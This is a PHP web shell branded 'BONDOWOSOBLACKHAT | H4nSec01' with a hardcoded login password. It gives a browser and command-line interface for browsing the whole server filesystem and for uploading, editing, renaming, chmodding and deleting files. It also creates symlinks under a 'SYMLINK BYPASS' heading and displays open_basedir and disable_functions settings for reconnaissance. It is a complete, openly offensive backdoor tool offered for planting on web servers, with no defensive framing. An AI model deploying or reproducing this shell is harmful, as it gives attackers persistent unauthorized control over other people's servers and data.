#!/usr/bin/env php
<?php
// ============================================================
// PHP FILE MANAGER - (BONDOWOSOBLACKHAT | H4nSec01)
// Mode: WEB (browser) + CLI (terminal upload bypass 403)
// AUTHOR: H4NSEC01
// ============================================================

// ---------- CLI MODE (TERMINAL UPLOADER) ----------
if (php_sapi_name() === 'cli') {
    // Parse command line arguments
    if ($argc < 2) {
        echo "\n=== BONDOWOSOBLACKHAT UPLOADER ===\n";
        echo "Usage: php " . basename($argv[0]) . " upload <source_file> [target_directory]\n";
        echo "Example: php " . basename($argv[0]) . " upload /home/user/file.zip /home/user/public_html/upload/\n";
        echo "Note: This bypasses web server (no 403 error).\n\n";
        exit(0);
    }
    
    $command = $argv[1];
    if ($command === 'upload' && isset($argv[2])) {
        $source = $argv[2];
        $target_dir = isset($argv[3]) ? rtrim($argv[3], '/') . '/' : getcwd() . '/';
        
        if (!file_exists($source)) {
            echo "ERROR: Source file not found: $source\n";
            exit(1);
        }
        if (!is_readable($source)) {
            echo "ERROR: Source file not readable.\n";
            exit(1);
        }
        if (!is_dir($target_dir)) {
            echo "ERROR: Target directory not found: $target_dir\n";
            exit(1);
        }
        if (!is_writable($target_dir)) {
            echo "ERROR: Target directory not writable.\n";
            exit(1);
        }
        
        $filename = basename($source);
        $destination = $target_dir . $filename;
        if (copy($source, $destination)) {
            echo "SUCCESS: File uploaded to $destination\n";
            echo "Size: " . filesize($destination) . " bytes\n";
        } else {
            echo "ERROR: Copy failed.\n";
            exit(1);
        }
    } else {
        echo "Unknown CLI command. Use: upload\n";
    }
    exit(0);
}

// ============================================================
// WEB MODE (BROWSER) - START SESSION & AUTH
// ============================================================
session_start();

// ---------- CONFIGURATION ----------
$auth_password = 'H4nSec01';   // CHANGE THIS
$timezone = 'Asia/Jakarta';
date_default_timezone_set($timezone);

// ---------- AUTH WITH GTA LOGO ----------
if (!isset($_SESSION['fm_auth']) || $_SESSION['fm_auth'] !== true) {
    if (isset($_POST['password']) && $_POST['password'] === $auth_password) {
        $_SESSION['fm_auth'] = true;
    } else {
        echo '<!DOCTYPE html><html><head><title>BondowosoBlackHat - File Manager</title><style>
        @import url("https://fonts.googleapis.com/css2?family=Black+Ops+One&display=swap");
        *{margin:0;padding:0;box-sizing:border-box;}
        body{background:linear-gradient(135deg, #0a2e0a 0%, #1a4a1a 100%);display:flex;justify-content:center;align-items:center;height:100vh;font-family:"Black Ops One","Pricedown",Impact,"Arial Black",sans-serif;}
        .login-box{background:rgba(255,255,255,0.95);padding:40px;border-radius:20px;box-shadow:0 0 30px rgba(0,255,0,0.4);border:3px solid #00cc44;width:360px;text-align:center;}
        .logo{font-size:28px;color:#1a5a1a;text-shadow:2px 2px 0 #aaffaa;letter-spacing:2px;margin-bottom:5px;}
        .logo small{font-size:14px;display:block;color:#2e8b57;letter-spacing:1px;}
        .gta-sub{font-family:monospace;color:#226622;margin-bottom:20px;font-size:12px;}
        h2{color:#226622;font-size:22px;margin-bottom:20px;border-top:2px solid #00cc44;padding-top:15px;}
        input,button{width:100%;padding:12px;margin:10px 0;background:#f0fff0;border:2px solid #00cc44;color:#1a5a1a;font-family:monospace;font-size:16px;border-radius:8px;}
        button{background:#00cc44;color:#fff;font-weight:bold;border:none;cursor:pointer;font-family:"Black Ops One",Impact;}
        button:hover{background:#00aa33;}
        </style></head><body>
        <div class="login-box">
            <div class="logo">BONDOWOSOBLACKHAT<br><small>File manager</small></div>
            <div class="gta-sub">ALL RIGHT REVERSED 2024</div>
            <h2>H4nSec01</h2>
            <form method="post">
                <input type="password" name="password" placeholder="ENTER PASSWORD" autofocus>
                <button type="submit">ACCESS</button>
            </form>
        </div>
        </body></html>';
        exit;
    }
}

// ---------- FUNCTIONS ----------
function format_bytes($bytes) {
    if ($bytes >= 1073741824) return round($bytes / 1073741824, 2) . ' GB';
    if ($bytes >= 1048576) return round($bytes / 1048576, 2) . ' MB';
    if ($bytes >= 1024) return round($bytes / 1024, 2) . ' KB';
    return $bytes . ' B';
}

function get_perm_string($perms) {
    if (($perms & 0xC000) == 0xC000) $info = 's';
    elseif (($perms & 0xA000) == 0xA000) $info = 'l';
    elseif (($perms & 0x8000) == 0x8000) $info = '-';
    elseif (($perms & 0x4000) == 0x4000) $info = 'd';
    else $info = 'u';
    $info .= (($perms & 0x0100) ? 'r' : '-');
    $info .= (($perms & 0x0080) ? 'w' : '-');
    $info .= (($perms & 0x0040) ? (($perms & 0x0800) ? 's' : 'x') : (($perms & 0x0800) ? 'S' : '-'));
    $info .= (($perms & 0x0020) ? 'r' : '-');
    $info .= (($perms & 0x0010) ? 'w' : '-');
    $info .= (($perms & 0x0008) ? (($perms & 0x0400) ? 's' : 'x') : (($perms & 0x0400) ? 'S' : '-'));
    $info .= (($perms & 0x0004) ? 'r' : '-');
    $info .= (($perms & 0x0002) ? 'w' : '-');
    $info .= (($perms & 0x0001) ? (($perms & 0x0200) ? 't' : 'x') : (($perms & 0x0200) ? 'T' : '-'));
    return $info;
}

// Get current directory
$current_dir = '/';
if (isset($_GET['dir']) && !empty($_GET['dir'])) {
    $input_dir = $_GET['dir'];
    $input_dir = str_replace("\0", '', $input_dir);
    $real = @realpath($input_dir);
    if ($real !== false && is_dir($real)) {
        $current_dir = rtrim($real, '/') . '/';
        $_SESSION['last_dir'] = $current_dir;
    } elseif (is_dir($input_dir)) {
        $current_dir = rtrim($input_dir, '/') . '/';
        $_SESSION['last_dir'] = $current_dir;
    } elseif (isset($_SESSION['last_dir'])) {
        $current_dir = $_SESSION['last_dir'];
    } else {
        $current_dir = rtrim($_SERVER['DOCUMENT_ROOT'] ?? __DIR__, '/') . '/';
        $_SESSION['last_dir'] = $current_dir;
    }
} elseif (isset($_SESSION['last_dir'])) {
    $current_dir = $_SESSION['last_dir'];
} else {
    $current_dir = rtrim($_SERVER['DOCUMENT_ROOT'] ?? __DIR__, '/') . '/';
    $_SESSION['last_dir'] = $current_dir;
}

// Handle POST actions (web upload, rename, etc.)
$message = '';
$error = '';
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $action = $_POST['action'] ?? '';

    if ($action === 'upload' && isset($_FILES['upload_file'])) {
        $dest = $current_dir . basename($_FILES['upload_file']['name']);
        if (move_uploaded_file($_FILES['upload_file']['tmp_name'], $dest)) {
            $message = "Uploaded: " . htmlspecialchars(basename($_FILES['upload_file']['name']));
        } else {
            $error = "Upload failed (maybe 403). Try CLI upload method.";
        }
    }
    elseif ($action === 'rename' && !empty($_POST['target']) && !empty($_POST['new_name'])) {
        $old = $current_dir . $_POST['target'];
        $new = $current_dir . $_POST['new_name'];
        if (file_exists($old) && rename($old, $new)) {
            $message = "Renamed: {$_POST['target']} -> {$_POST['new_name']}";
        } else {
            $error = "Rename failed.";
        }
    }
    elseif ($action === 'chmod' && !empty($_POST['chmod_target']) && !empty($_POST['perms'])) {
        $path = $current_dir . $_POST['chmod_target'];
        $octal = intval($_POST['perms'], 8);
        if (@chmod($path, $octal)) {
            $message = "Chmod {$_POST['perms']} applied to {$_POST['chmod_target']}";
        } else {
            $error = "Chmod failed.";
        }
    }
    elseif ($action === 'edit_save' && !empty($_POST['target']) && isset($_POST['content'])) {
        $path = $current_dir . $_POST['target'];
        if (file_put_contents($path, $_POST['content']) !== false) {
            $message = "Saved: {$_POST['target']}";
        } else {
            $error = "Save failed.";
        }
    }
    elseif ($action === 'mkdir' && !empty($_POST['new_folder'])) {
        $path = $current_dir . basename($_POST['new_folder']);
        if (!file_exists($path)) {
            if (@mkdir($path, 0755)) {
                $message = "Folder created: " . basename($_POST['new_folder']);
            } else {
                $error = "Cannot create folder.";
            }
        } else {
            $error = "Folder exists.";
        }
    }
    elseif ($action === 'touch' && !empty($_POST['new_file'])) {
        $path = $current_dir . basename($_POST['new_file']);
        if (!file_exists($path)) {
            if (file_put_contents($path, '') !== false) {
                $message = "File created: " . basename($_POST['new_file']);
            } else {
                $error = "Cannot create file.";
            }
        } else {
            $error = "File exists.";
        }
    }
    elseif ($action === 'delete' && !empty($_POST['target'])) {
        $path = $current_dir . $_POST['target'];
        if (is_file($path)) {
            if (@unlink($path)) $message = "Deleted file: {$_POST['target']}";
            else $error = "Delete failed.";
        } elseif (is_dir($path)) {
            if (count(glob($path . '/*')) === 0) {
                if (@rmdir($path)) $message = "Deleted empty folder: {$_POST['target']}";
                else $error = "Cannot delete folder.";
            } else {
                $error = "Folder not empty.";
            }
        }
    }
    elseif ($action === 'go_path' && !empty($_POST['manual_path'])) {
        $new_path = $_POST['manual_path'];
        $new_path = str_replace("\0", '', $new_path);
        $real = @realpath($new_path);
        if ($real !== false && is_dir($real)) {
            $current_dir = rtrim($real, '/') . '/';
            $_SESSION['last_dir'] = $current_dir;
            header("Location: ?dir=" . urlencode($current_dir));
            exit;
        } elseif (is_dir($new_path)) {
            $current_dir = rtrim($new_path, '/') . '/';
            $_SESSION['last_dir'] = $current_dir;
            header("Location: ?dir=" . urlencode($current_dir));
            exit;
        } else {
            $error = "Invalid directory: " . htmlspecialchars($new_path);
        }
    }
    elseif ($action === 'create_symlink' && !empty($_POST['target_path']) && !empty($_POST['link_name'])) {
        $target = $_POST['target_path'];
        $link_name = $current_dir . basename($_POST['link_name']);
        if (function_exists('symlink')) {
            if (@symlink($target, $link_name)) {
                $message = "Symlink created: " . basename($_POST['link_name']) . " -> $target";
            } else {
                $error = "Symlink creation failed.";
            }
        } else {
            $error = "symlink() disabled.";
        }
    }
}

// Refresh current directory after actions
if (isset($_SESSION['last_dir'])) {
    $current_dir = $_SESSION['last_dir'];
    if (!is_dir($current_dir)) {
        $current_dir = rtrim($_SERVER['DOCUMENT_ROOT'] ?? __DIR__, '/') . '/';
        $_SESSION['last_dir'] = $current_dir;
    }
}

// Read directory
$items = @scandir($current_dir);
if ($items === false) {
    $error = "Cannot read directory: " . htmlspecialchars($current_dir);
    $items = [];
}
$dirs = [];
$files = [];
foreach ($items as $item) {
    if ($item == '.' || $item == '..') continue;
    $full = $current_dir . $item;
    if (is_dir($full)) $dirs[] = $item;
    else $files[] = $item;
}
sort($dirs, SORT_NATURAL | SORT_FLAG_CASE);
sort($files, SORT_NATURAL | SORT_FLAG_CASE);
$all_items = array_merge($dirs, $files);

$edit_file = isset($_GET['edit']) ? basename($_GET['edit']) : '';
$edit_content = '';
if ($edit_file && file_exists($current_dir . $edit_file) && is_file($current_dir . $edit_file)) {
    $edit_content = htmlspecialchars(file_get_contents($current_dir . $edit_file));
}

$open_basedir = ini_get('open_basedir');
$disable_functions = ini_get('disable_functions');
$is_writable = is_writable($current_dir) ? 'YES' : 'NO';
$symlink_available = function_exists('symlink') && !in_array('symlink', explode(',', $disable_functions));

// Show CLI helper message
$cli_help = "To bypass 403, use terminal: php " . basename($_SERVER['SCRIPT_FILENAME']) . " upload /path/to/source/file " . $current_dir;
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>BondowosoBlackHat</title>
    <style>
        @import url("https://fonts.googleapis.com/css2?family=Black+Ops+One&display=swap");
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            background: linear-gradient(135deg, #0a2e0a 0%, #1a4a1a 100%);
            font-family: 'Black Ops One', 'Pricedown', Impact, 'Arial Black', sans-serif;
            padding: 20px;
            color: #fff;
        }
        .container {
            max-width: 1400px;
            margin: 0 auto;
            background: rgba(255,255,255,0.95);
            border-radius: 20px;
            box-shadow: 0 0 30px rgba(0,255,0,0.4);
            border: 3px solid #00cc44;
            overflow: hidden;
        }
        .header {
            background: #00cc44;
            padding: 20px 30px;
            text-align: center;
            border-bottom: 3px solid #fff;
        }
        .header h1 {
            font-size: 2.2rem;
            letter-spacing: 3px;
            color: #fff;
            text-shadow: 3px 3px 0 #1a5a1a;
            font-family: 'Black Ops One', Impact;
        }
        .header .sub {
            font-family: monospace;
            color: #fff;
            font-size: 0.9rem;
            background: #1a5a1a;
            display: inline-block;
            padding: 4px 15px;
            border-radius: 30px;
        }
        .path-bar {
            background: #f0fff0;
            padding: 12px 25px;
            border-bottom: 2px solid #00cc44;
            display: flex;
            flex-wrap: wrap;
            justify-content: space-between;
            align-items: center;
        }
        .path {
            background: #fff;
            padding: 6px 15px;
            font-family: monospace;
            color: #1a5a1a;
            border-left: 4px solid #00cc44;
            border-radius: 8px;
        }
        .writable {
            background: #00cc44;
            color: #fff;
            padding: 4px 12px;
            border-radius: 20px;
            font-weight: bold;
        }
        .manual-nav {
            background: #f0fff0;
            padding: 12px 25px;
            border-bottom: 2px solid #00cc44;
            display: flex;
            flex-wrap: wrap;
            gap: 10px;
            align-items: center;
        }
        .manual-nav form {
            display: flex;
            flex: 1;
            gap: 10px;
        }
        .manual-nav input {
            flex: 3;
            padding: 8px 12px;
            background: #fff;
            border: 2px solid #00cc44;
            color: #1a5a1a;
            font-family: monospace;
            border-radius: 8px;
        }
        button, .nav-btn {
            background: #00cc44;
            color: #fff;
            border: none;
            padding: 8px 20px;
            font-weight: bold;
            cursor: pointer;
            font-family: 'Black Ops One', Impact;
            text-decoration: none;
            display: inline-block;
            border-radius: 8px;
        }
        button:hover, .nav-btn:hover {
            background: #00aa33;
        }
        .cli-notice {
            background: #fff3cd;
            border-left: 4px solid #ffc107;
            padding: 10px 20px;
            margin: 10px 20px;
            color: #856404;
            font-family: monospace;
            font-size: 0.8rem;
            border-radius: 8px;
        }
        .two-columns {
            display: flex;
            flex-wrap: wrap;
        }
        .sidebar {
            width: 300px;
            background: #f9fff9;
            border-right: 2px solid #00cc44;
            padding: 20px;
        }
        .main-content {
            flex: 1;
            padding: 20px;
            overflow-x: auto;
        }
        .action-card {
            background: #fff;
            border: 2px solid #00cc44;
            border-radius: 16px;
            margin-bottom: 20px;
            padding: 15px;
            box-shadow: 0 2px 8px rgba(0,0,0,0.05);
        }
        .action-card h3 {
            color: #1a5a1a;
            border-left: 4px solid #00cc44;
            padding-left: 10px;
            margin-bottom: 12px;
            font-size: 1.2rem;
        }
        .form-group {
            margin-bottom: 10px;
            display: flex;
            flex-wrap: wrap;
            gap: 8px;
        }
        input, select, textarea {
            background: #fff;
            border: 1px solid #00cc44;
            color: #1a5a1a;
            padding: 8px;
            font-family: monospace;
            border-radius: 8px;
        }
        table {
            width: 100%;
            border-collapse: collapse;
        }
        th, td {
            text-align: left;
            padding: 10px 8px;
            border-bottom: 1px solid #00cc44;
        }
        th {
            background: #e0ffe0;
            color: #1a5a1a;
            font-family: 'Black Ops One', Impact;
            letter-spacing: 1px;
        }
        tr:hover {
            background: #e0ffe0;
        }
        .folder-link {
            color: #1a5a1a;
            text-decoration: none;
            font-weight: bold;
        }
        .folder-link:hover {
            color: #00cc44;
        }
        .actions form {
            display: inline;
        }
        .small-btn {
            background: #e0ffe0;
            color: #1a5a1a;
            padding: 4px 8px;
            font-size: 0.7rem;
            margin: 0 2px;
            border: 1px solid #00cc44;
            border-radius: 6px;
        }
        .message {
            background: #d4edda;
            color: #155724;
            padding: 10px 20px;
            margin: 10px 20px;
            border-left: 4px solid #28a745;
            border-radius: 8px;
        }
        .error {
            background: #f8d7da;
            color: #721c24;
            border-left-color: #dc3545;
        }
        .server-info {
            background: #fff;
            border: 1px solid #00cc44;
            border-radius: 12px;
            padding: 10px;
            font-size: 0.7rem;
            font-family: monospace;
            margin-top: 20px;
        }
        .footer {
            text-align: center;
            padding: 15px;
            border-top: 2px solid #00cc44;
            font-size: 0.7rem;
            font-family: monospace;
            background: #f0fff0;
            color: #1a5a1a;
        }
        @media (max-width: 800px) {
            .sidebar { width: 100%; border-right: none; border-bottom: 2px solid #00cc44; }
        }
    </style>
</head>
<body>
<div class="container">
    <div class="header">
        <h1>BONDOWOSOBLACKHAT</h1>
        <div class="sub">H4nSec01</div>
    </div>
    <div class="path-bar">
        <div class="path">CURRENT: <?php echo htmlspecialchars($current_dir); ?></div>
        <div class="writable">WRITABLE: <?php echo $is_writable; ?></div>
    </div>
    <div class="manual-nav">
        <strong style="color:#1a5a1a;">JUMP:</strong>
        <form method="post">
            <input type="hidden" name="action" value="go_path">
            <input type="text" name="manual_path" value="<?php echo htmlspecialchars($current_dir); ?>">
            <button type="submit">GO</button>
        </form>
        <a href="?dir=<?php echo urlencode(dirname(rtrim($current_dir,'/'))); ?>" class="nav-btn">PARENT</a>
        <a href="?" class="nav-btn">RESET</a>
    </div>
    <?php if ($message): ?><div class="message"><?php echo htmlspecialchars($message); ?></div><?php endif; ?>
    <?php if ($error): ?><div class="message error"><?php echo htmlspecialchars($error); ?></div><?php endif; ?>
    <div class="cli-notice">
         CLI UPLOAD BYPASS 403: <code><?php echo htmlspecialchars($cli_help); ?></code>
    </div>
    <div class="two-columns">
        <div class="sidebar">
            <div class="action-card">
                <h3>UPLOAD (WEB)</h3>
                <form method="post" enctype="multipart/form-data">
                    <input type="hidden" name="action" value="upload">
                    <input type="file" name="upload_file" required>
                    <button type="submit">UPLOAD</button>
                </form>
                <div style="font-size:0.7rem; margin-top:8px;">If 403, use CLI method above.</div>
            </div>
            <div class="action-card">
                <h3>CREATE FOLDER</h3>
                <form method="post">
                    <input type="hidden" name="action" value="mkdir">
                    <input type="text" name="new_folder" placeholder="folder_name" required>
                    <button type="submit">CREATE</button>
                </form>
            </div>
            <div class="action-card">
                <h3>CREATE FILE</h3>
                <form method="post">
                    <input type="hidden" name="action" value="touch">
                    <input type="text" name="new_file" placeholder="file.txt" required>
                    <button type="submit">CREATE</button>
                </form>
            </div>
            <div class="action-card">
                <h3>RENAME</h3>
                <form method="post">
                    <input type="hidden" name="action" value="rename">
                    <input type="text" name="target" placeholder="current name" required>
                    <input type="text" name="new_name" placeholder="new name" required>
                    <button type="submit">RENAME</button>
                </form>
            </div>
            <div class="action-card">
                <h3>CHMOD (octal)</h3>
                <form method="post">
                    <input type="hidden" name="action" value="chmod">
                    <input type="text" name="chmod_target" placeholder="file/folder name" required>
                    <input type="text" name="perms" placeholder="0755 or 0644" required>
                    <button type="submit">CHMOD</button>
                </form>
            </div>
            <div class="action-card">
                <h3>SYMLINK BYPASS</h3>
                <form method="post">
                    <input type="hidden" name="action" value="create_symlink">
                    <input type="text" name="target_path" placeholder="Target absolute path" required>
                    <input type="text" name="link_name" placeholder="Link name (in current dir)" required>
                    <button type="submit">CREATE SYMLINK</button>
                </form>
                <div style="font-size:0.7rem; margin-top:8px;">Symlink: <?php echo $symlink_available ? 'ENABLED' : 'DISABLED'; ?></div>
            </div>
            <div class="server-info">
                <strong>SERVER INFO</strong><br>
                PHP: <?php echo phpversion(); ?><br>
                open_basedir: <?php echo htmlspecialchars($open_basedir ?: 'NOT SET'); ?><br>
                disable_functions: <?php echo htmlspecialchars($disable_functions ?: 'none'); ?>
            </div>
        </div>
        <div class="main-content">
            <table>
                <thead><tr><th>NAME</th><th>SIZE</th><th>PERMS</th><th>MODIFIED</th><th>ACTIONS</th></tr></thead>
                <tbody>
                <?php foreach ($all_items as $item):
                    $full = $current_dir . $item;
                    $is_dir = is_dir($full);
                    $perms = substr(sprintf('%o', fileperms($full)), -4);
                    $perm_str = get_perm_string(fileperms($full));
                    $size = $is_dir ? '-' : format_bytes(filesize($full));
                    $mtime = date('Y-m-d H:i:s', filemtime($full));
                ?>
                    <tr>
                        <td>
                            <?php if ($is_dir): ?>
                                <a href="?dir=<?php echo urlencode($full); ?>" class="folder-link">📁 <?php echo htmlspecialchars($item); ?></a>
                            <?php else: ?>
                                📄 <?php echo htmlspecialchars($item); ?>
                            <?php endif; ?>
                        </td>
                        <td><?php echo $size; ?></td>
                        <td><?php echo $perms . ' (' . $perm_str . ')'; ?></td>
                        <td><?php echo $mtime; ?></td>
                        <td class="actions">
                            <?php if (!$is_dir): ?>
                                <a href="?edit=<?php echo urlencode($item); ?>&dir=<?php echo urlencode($current_dir); ?>"><button type="button" class="small-btn">EDIT</button></a>
                            <?php endif; ?>
                            <form method="post" style="display:inline;" onsubmit="return confirm('DELETE <?php echo htmlspecialchars($item); ?> ?');">
                                <input type="hidden" name="action" value="delete">
                                <input type="hidden" name="target" value="<?php echo htmlspecialchars($item); ?>">
                                <button type="submit" class="small-btn">DEL</button>
                            </form>
                        </td>
                    </tr>
                <?php endforeach; ?>
                </tbody>
            </table>
            <?php if ($edit_file): ?>
            <div style="margin-top:30px; background:#fff; border:2px solid #00cc44; border-radius:16px; padding:20px;">
                <h3 style="color:#1a5a1a;">EDITING: <?php echo htmlspecialchars($edit_file); ?></h3>
                <form method="post">
                    <input type="hidden" name="action" value="edit_save">
                    <input type="hidden" name="target" value="<?php echo htmlspecialchars($edit_file); ?>">
                    <textarea name="content" rows="15" style="width:100%; background:#f0fff0; color:#1a5a1a; border:1px solid #00cc44; border-radius:8px;"><?php echo $edit_content; ?></textarea>
                    <div style="margin-top:10px;">
                        <button type="submit">SAVE</button>
                        <a href="?dir=<?php echo urlencode($current_dir); ?>" class="nav-btn" style="background:#aaa;">CANCEL</a>
                    </div>
                </form>
            </div>
            <?php endif; ?>
        </div>
    </div>
    <div class="footer">
        BondowosoBlackHat // H4nSec01 | GTA Style File Manager | CLI upload bypass 403
    </div>
</div>
</body>
</html>